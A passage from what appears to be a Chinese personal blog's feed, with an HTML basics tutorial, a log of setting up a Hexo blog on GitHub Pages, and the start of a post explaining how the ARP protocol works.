    <url>/2023/01/15/HTML%E8%B6%85%E6%96%87%E6%9C%AC%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<p>偷偷卷🧐</p><span id="more"></span><h1 id="HTML简介"><a href="#HTML简介" class="headerlink" title="HTML简介"></a>HTML简介</h1><p>HTML 是用来描述网页的一种语言，指的是超文本<strong>标记语言</strong> (<strong>H</strong>yper <strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage)</p><h3 id="HTML标签"><a href="#HTML标签" class="headerlink" title="HTML标签"></a>HTML标签</h3><p>HTML 标签是由<strong>尖括号</strong>包围的关键词，比如 &lt;html&gt;。</p><p>HTML 标签对大小写不敏感，大写标签和小写标签等效，但推荐使用小写。</p><p>且HTML标签通常成对存在，出现的第一个标签是开始标签，第二个标签是结束标签，结束标签内有’&#x2F;‘，比如&lt;b&gt; 和 &lt;&#x2F;b&gt;</p><h3 id="HTML文档-x3D-网页"><a href="#HTML文档-x3D-网页" class="headerlink" title="HTML文档 &#x3D; 网页"></a>HTML文档 &#x3D; 网页</h3><p>HTML文档也被称作网页，包含HTML标签和纯文本。</p><p>Web 浏览器的作用是读取 HTML 文档，并以网页的形式显示出它们。浏览器不会显示 HTML 标签，而是使用标签来解释页面的内容。</p><h1 id="HTML基础标签"><a href="#HTML基础标签" class="headerlink" title="HTML基础标签"></a>HTML基础标签</h1><h3 id="网页标题"><a href="#网页标题" class="headerlink" title="网页标题"></a>网页标题</h3><p>通过&lt;title&gt;标签定义，将会显示在浏览器导航栏处</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>这是导航栏标题<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>浏览器会忽略注释，也不会显示它们。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 这是个注释 --&gt;</span><br></code></pre></td></tr></table></figure><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><p>通过&lt;h1&gt; - &lt;h6&gt; 等标签进行定义，六个数字1-6对应从大到小的六种标题大小。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>一级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>二级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>三级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h3><p>通过&lt;hr &#x2F;&gt; 标签进行定义的。</p><h3 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h3><p>段落通过 &lt;p&gt; 标签进行定义，&lt;br&gt;标签定义换行。</p><p>浏览器会自动地在段落的前后添加空行。但对于在一对标签内的文字，无论编写时有无换行，只要不添加&lt;br&gt;标签，最终效果都在同一行。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>This is a paragraph.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>This is a paragraph.<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>This is another paragraph.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p> <code>&lt;br&gt;</code>标签没有结束标签</p></blockquote><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>通过 &lt;a&gt; 标签进行定义的。</p><p>双引号内为跳转链接，一对标签中间的文本为页面展示文本。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://shmodifier.github.io/&quot;</span>&gt;</span>我的博客<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h3><p>通过 &lt;img&gt; 标签进行定义的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;图片文件路径&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;[图片宽]&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;[图片高]&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h1 id="HTML属性"><a href="#HTML属性" class="headerlink" title="HTML属性"></a>HTML属性</h1><p>属性在 HTML 元素的<strong>开始标签</strong>中规定，供了有关 HTML 元素的更多的信息。</p><p>属性值应该始终被包括在引号内。双引号是最常用的，不过使用单引号也没有问题。在某些个别的情况下，比如属性值本身就含有双引号，那么必须使用单引号。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span> 居中排列标题<br></code></pre></td></tr></table></figure><h1 id="处理文本"><a href="#处理文本" class="headerlink" title="处理文本"></a>处理文本</h1><h5 id="格式化标签"><a href="#格式化标签" class="headerlink" title="格式化标签"></a>格式化标签</h5><p>在html代码中,可单独使用也可和其他标签同时使用</p><table><thead><tr><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>&lt;b&gt;或&lt;strong&gt;</td><td>定义粗体</td></tr><tr><td>&lt;em&gt;或&lt;i&gt;</td><td>定义斜体</td></tr><tr><td>&lt;samall&gt;</td><td>定义小号字</td></tr><tr><td>&lt;sub&gt;</td><td>定义下标字</td></tr><tr><td>&lt;sup&gt;</td><td>定义上标字</td></tr><tr><td>&lt;ins&gt;</td><td>定义下划线</td></tr><tr><td>&lt;del&gt;</td><td>定义删除线</td></tr></tbody></table><p>eg:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>输出演示<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ins</span>&gt;</span>下划线演示<span class="hljs-tag">&lt;/<span class="hljs-name">ins</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>上下标演示段落<span class="hljs-tag">&lt;<span class="hljs-name">sup</span>&gt;</span>下标演示<span class="hljs-tag">&lt;/<span class="hljs-name">sup</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>上下标演示段落<span class="hljs-tag">&lt;<span class="hljs-name">sub</span>&gt;</span>上标演示<span class="hljs-tag">&lt;/<span class="hljs-name">sub</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>粗体斜体叠加演示<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>小字体演示<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/HTML%E8%B6%85%E6%96%87%E6%9C%AC%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/Snipaste_2023-01-16_21-20-04.png"></p><h1 id="HTML链接"><a href="#HTML链接" class="headerlink" title="HTML链接"></a>HTML链接</h1><p>使用标签 &lt;a&gt;来设置超文本链接。</p><p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;[url]&quot;</span>&gt;</span>链接文本<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>href 属性描述了链接的目标。.</p></blockquote><h3 id="target属性"><a href="#target属性" class="headerlink" title="target属性"></a>target属性</h3><p>使用 target 属性，可以定义被链接的文档在何处显示。</p><p><code>_blank</code>表示在新窗口打开文档</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;[url]&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>链接文本<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="id属性"><a href="#id属性" class="headerlink" title="id属性"></a>id属性</h3><p>id 属性可用于创建一个 HTML 文档书签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>输出演示<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;tips&quot;</span>&gt;</span>标签演示<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#tips&quot;</span>&gt;</span>跳转到标签演示<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;[网页地址]/#tips&quot;</span>&gt;</span>跳转到标签演示<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <br><span class="hljs-comment">&lt;!--连接到外部网页的标签--&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/HTML%E8%B6%85%E6%96%87%E6%9C%AC%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/Snipaste_2023-01-19_16-19-47.png"></p><h1 id="头部-lt-head-gt"><a href="#头部-lt-head-gt" class="headerlink" title="头部&lt;head&gt;"></a>头部&lt;head&gt;</h1><p>可以添加在头部区域的元素标签为: &lt;title&gt;, &lt;style&gt;, &lt;meta&gt;, &lt;link&gt;, &lt;script&gt;, &lt;noscript&gt; 和 &lt;base&gt;。</p><h3 id="lt-title-gt"><a href="#lt-title-gt" class="headerlink" title="&lt;title&gt;"></a>&lt;title&gt;</h3><p><code>&lt;title&gt;</code> 标签定义了不同文档的标题。&lt;title&gt; 在 HTML&#x2F;XHTML 文档中是必需的。</p><blockquote><p>显示在收藏夹中的标题、显示在搜索引擎结果页面的标题以及浏览器工具栏的标题。</p></blockquote><h3 id="lt-base-gt"><a href="#lt-base-gt" class="headerlink" title="&lt;base&gt;"></a>&lt;base&gt;</h3><p><code>&lt;base&gt;</code> 标签描述了基本的<strong>链接地址&#x2F;链接目标</strong>，该标签作为HTML文档中所有的链接标签的默认链接。</p><p>eg:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;[url]&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="lt-link-gt"><a href="#lt-link-gt" class="headerlink" title="&lt;link&gt;"></a>&lt;link&gt;</h3><p><code>&lt;link&gt;</code> 标签定义了文档与<strong>外部资源</strong>之间的关系，通常用于链接到样式表。</p><h3 id="lt-style-gt"><a href="#lt-style-gt" class="headerlink" title="&lt;style&gt;"></a>&lt;style&gt;</h3><p>&lt;style&gt; 标签定义了HTML文档的样式文件引用地址.</p><h3 id="lt-meta-gt"><a href="#lt-meta-gt" class="headerlink" title="&lt;meta&gt;"></a>&lt;meta&gt;</h3><p>&lt;meta&gt; 元素通常用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他<strong>元数据</strong>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs HTML">为搜索引擎定义关键词：<br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;keywords&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;HTML, CSS, XML, XHTML, JavaScript&quot;</span>&gt;</span><br>为网页定义描述内容:<br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;免费 Web &amp; 编程 教程&quot;</span>&gt;</span><br>定义网页作者:<br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;author&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;Runoob&quot;</span>&gt;</span><br>每30秒钟刷新当前页面:<br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;30&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>HTML</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一起来搭博客</title>
    <link href="/2023/01/07/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/"/>
    <url>/2023/01/07/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>利用hexo+GitHub搭建一个属于自己的博客</p><span id="more"></span><p>又名：我怎么什么都不会之踩坑记录🥀</p><p>建议在powershell执行命令，cmd有些步骤会提示权限不够</p><p>”踩坑“部分都是遇到的问题和吐槽的碎碎念，如果在过程中没有遇到问题就不用看🥰</p><h2 id="git下载"><a href="#git下载" class="headerlink" title="git下载"></a>git下载</h2><p>这里暂时先默认有git，因为当时搭博客的之前就有用到git了。</p><p>等我有空补上😇</p><h2 id="node-js下的Hexo安装和换源"><a href="#node-js下的Hexo安装和换源" class="headerlink" title="node.js下的Hexo安装和换源"></a>node.js下的Hexo安装和换源</h2><h4 id="node-js安装"><a href="#node-js安装" class="headerlink" title="node.js安装"></a>node.js安装</h4><p>首先需要给电脑安装一个node.js</p><p><a href="https://nodejs.org/en/download/">下载链接</a></p><p>我当时还没有记笔记的习惯所以node下载和配置这里没有笔记</p><p>可以看看菜鸟教程讲的很详细了</p><p><a href="https://www.runoob.com/nodejs/nodejs-install-setup.html">Node.js 安装配置 | 菜鸟教程 (runoob.com)</a></p><h4 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h4><p>给node.js换一个淘宝镜像，不然接下来下载hexo会timeout。</p><p>直接打开power shell输入以下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org<br></code></pre></td></tr></table></figure><p>时间会比较长可以下楼跑个两公里</p><h4 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h4><p>powershell输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm install <span class="hljs-literal">-g</span> hexo<span class="hljs-literal">-cli</span><br></code></pre></td></tr></table></figure><p>换源以后下载速度贼快</p><h4 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h4><p>（接下来是不重要的碎碎念可以直接跳过看下一趴）</p><p>最开始看的教程说要修改环境变量，修改了大半天。执行npm install的时候一直报错，一气之下把node所有文件都删了，重新下载。</p><p><del>(别学我，遇到报错要找问题原因而不是逃避)</del></p><blockquote><p>大半夜下载不动寻求卷师傅帮忙，卷发现我的代理地址没更新，狠狠拖后腿。🥲</p></blockquote><p>重新下载之后保持自动配置的环境变量不变，在命令行里直接npm install发现还是报以前一样的错。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-01-33.png"></p><p>复制百度发现是权限不够，要用管理员方式执行命令。</p><blockquote><p>所以我白删了呗！！</p></blockquote><p>win+R打开管理员方式终端，再次输入显示timeout。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_10-59-37.png"></p><p>又百度发现需要换源。</p><p>直接从网上找了个现成的淘宝源，换好以后再install五秒成功。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-02-39.png"></p><h2 id="Hexo的网页配置"><a href="#Hexo的网页配置" class="headerlink" title="Hexo的网页配置"></a>Hexo的网页配置</h2><p>下载后输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">hexo init blog<br></code></pre></td></tr></table></figure><p>这个命令就是在powershell当前的根目录下新建一个名为blog的文件夹，用于后续配置文件的存放。</p><p>[<em>blog</em>]好像可以填别的文件名，但我没试过所以不建议。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-25-14.png"></p><p>建好文件夹之后初始化配置</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cd <span class="hljs-keyword">blog </span>  <span class="hljs-comment">#进入blog文件夹</span><br>npm <span class="hljs-keyword">install </span>   <br></code></pre></td></tr></table></figure><p>这个命令结束以后就可以看到blog文件夹里有很多文件喽，类似于下图这样。</p><p>图片里有些文件你没有也没关系，因为这是我建成博客又下载了很多东西之后补截的图。😳</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-03-13_21-01-30.png"></p><p>两条命令生成网页</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo generate<br>hexo server<br></code></pre></td></tr></table></figure><p>当然喽hexo善解人意地支持简写，可以直接输入 <code>hexo g</code>和<code>hexo s</code></p><p>用浏览器预览网址<a href="http://localhost:4000/">http://localhost:4000</a></p><p>因为我们还没配置GitHub所以这个时候就是Hexo最基础的丑陋页面。</p><h4 id="踩坑-1"><a href="#踩坑-1" class="headerlink" title="踩坑"></a>踩坑</h4><p>cmd里输入hexo命令后又报错</p><p>说hexo不是可以执行的命令，百度后发现是环境变量的问题，<del>该死的环境变量</del></p><p>发现hexo-cli的bin目录下没有.cmd的文件，但是前一个目录里有，就直接复制过来，又把bin添加到了环境变量里，再hexo init</p><p>运行成功但报错，<del>想死</del></p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_12-29-06.png"></p><p>据说是因为目录下没有这个文件夹，<del>为什么应该有hexo的文件夹啊</del></p><p>换个思路，用管理员模式重新下载hexo（我就个遇到困难卸载删除的菜鸡😶‍🌫️</p><p>下载后运行<code>hexo init blog</code></p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-24-15.png"></p><p>又一次向万能的互联网求助，修改了一下power shell的权限，再运行</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-25-14.png"></p><p>成功（？？）</p><blockquote><p>管理员模式yyds</p></blockquote><h2 id="GitHub配置网页"><a href="#GitHub配置网页" class="headerlink" title="GitHub配置网页"></a>GitHub配置网页</h2><p>在GitHub里建一个<strong>用户名.github.io</strong>的仓库，建好以后点击page把这个库变成一个网页。</p><p>我们在命令行输入<code>hexo d</code> 时默认上传<strong>master</strong>分支，但是在GitHub页面默认<strong>main</strong>分支，需要改成master。没有下拉选项，要手动输入</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-03-13_21-16-37.png"></p><p>但是这个时候先别hexo d，会报错，因为还没连接GitHub和hexo。</p><p>这时候你在浏览器搜索<code>https://用户名.github.io</code>，出现仓库的自述文件就是成功啦。</p><h2 id="SSH连接GitHub"><a href="#SSH连接GitHub" class="headerlink" title="SSH连接GitHub"></a>SSH连接GitHub</h2><p>也是默认大家有这玩意的哈</p><p>在git里面输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ssh<span class="hljs-literal">-keygen</span> <span class="hljs-literal">-t</span> rsa <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;[your_email@example.com]&quot;</span><br></code></pre></td></tr></table></figure><p>按回车之后会提示输入内容，可以全部按回车，表示使用默认的<code>~/.ssh</code>文件目录存放密钥，以及不设置密钥的密码。</p><p>在文件夹里找到.ssh文件，找到里面的密钥复制到GitHub。在个人设置页面的SSH and GPG keys 添加</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-02-20_23-36-59.png"></p><p>再打开git输入连接命令</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-42-49.png"></p><h2 id="Hexo内部操作"><a href="#Hexo内部操作" class="headerlink" title="Hexo内部操作"></a>Hexo内部操作</h2><h3 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h3><p><strong>在blog文件夹里操作</strong></p><p>创建新文章</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;文章标题&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-05-20.png"></p><p>还会贴心的告诉你建在哪里了</p><blockquote><p>它真的，我哭死</p></blockquote><p>之后就可以在这个文件夹里看到以“文章标题”命名的md文件，在里面修改之后再运行<code>hexo g</code>和<code>hexo s</code>就能在预览网页看到刚发的文档啦。</p><blockquote><p>这一趴无脑跟教程走没踩雷，我又活了🥳</p></blockquote><h5 id="配置环节"><a href="#配置环节" class="headerlink" title="配置环节"></a>配置环节</h5><p>配置文件[-config.yml]</p><p><code>title</code>修改网页导航栏标签</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-17-41.png"></p><p>让网页和GitHub联姻</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-09_21-03-45.png"></p><p><code>theme</code>改主题，直接复制主题名字就好</p><h4 id="踩坑-2"><a href="#踩坑-2" class="headerlink" title="踩坑"></a>踩坑</h4><p><code>hexo d</code>把写作部署到GitHub上，又报错啦哈哈哈</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-30-22.png"></p><p>万能的互联网说这个叫映射条目缩进错误，改了好几遍缩进都不对</p><p>还碰到了一个错误</p><blockquote><p>(101.1)错误的意思是第101行与前文重复，把这一行注释掉就行</p></blockquote><p>最后改成这样运行成功</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-49-15.png"></p><p>但是查看<a href="https://shmodifier.github.io还是不成功/">https://ShModifier.github.io还是不成功</a></p><p>后来发现我这聪明的小脑瓜把信息放错了位置🍃</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-09_21-03-45.png"></p><p>改成这样就好啦</p><hr><p>把搭博客的笔记发上来，给大家看看笑话☃️</p>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>GitHub</tag>
      
      <tag>Node</tag>
      
      <tag>Git</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于ARP欺骗和ARP攻击</title>
    <link href="/2023/01/05/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/"/>
    <url>/2023/01/05/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>趁着寒假偷偷卷哈哈哈🤪</p><span id="more"></span><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。</p><blockquote><p>每一台主机都有一个arp高速缓存，里面有本局域网中的各主机和路由器的IP地址到硬件地址的映射表</p></blockquote><h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><p>主机A和主机B各自有自己的IP地址和MAC地址，在主机A与主机B通信时，ARP协议可将主机B的IP地址解析为MAC地址。</p><p>第一步：</p><p>主机A首先确定用于访问主机B的IP地址，然后主机A在自己的本地ARP缓存中检查主机B的IP地址匹配的MAC地址</p><p>第二步：</p><p>如果主机A在ARP缓存中没有找到主机B的IP映射，它将询问主机B对应的硬件地址，会将ARP请求帧广播到本地网络上的所有主机，主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接受到ARP请求并检查是否与自己的IP地址匹配。如果主机发现请求的IP地址以自己的IP地址不匹配，他将丢弃ARP请求。</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/ARP1.png"></p><p>第三步：</p><p>主机B确定AARP请求中的IP地址于自己的IP地址匹配，并将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。</p><p>第四步：</p><p>主机B将包含MAC地址的ARP回复消息直接发送到主机A</p><p><img 